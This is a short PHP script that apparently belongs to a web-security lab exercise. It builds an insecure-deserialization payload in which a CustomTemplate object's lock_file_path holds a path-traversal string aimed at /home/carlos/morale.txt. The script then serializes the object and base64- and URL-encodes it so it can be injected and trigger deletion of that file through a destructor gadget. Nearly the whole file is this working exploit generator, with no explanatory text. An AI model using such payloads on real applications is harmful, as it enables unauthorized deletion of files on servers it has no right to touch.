<?php

class CustomTemplate {
    var $template_file_path;
    var $lock_file_path;

    function __destruct() {
        // Carlos thought this would be a good idea
       // if (file_exists($this->lock_file_path)) {
          //  unlink($this->lock_file_path);
        //}

        //echo $this->lock_file_path;
    }
}

class User {
    var $username;
    var $access_token;
}


$payload = new User();
$payload->access_token = 'nfdtmsf9mspqfqfz6gh5tofccmoz6h31';
$payload->username = new CustomTemplate();
$payload->username->lock_file_path = "../../../../../../../home/carlos/morale.txt";
$payload->username->template_file_path = "test.txt";

echo urlencode(base64_encode(serialize($payload->username)));

?>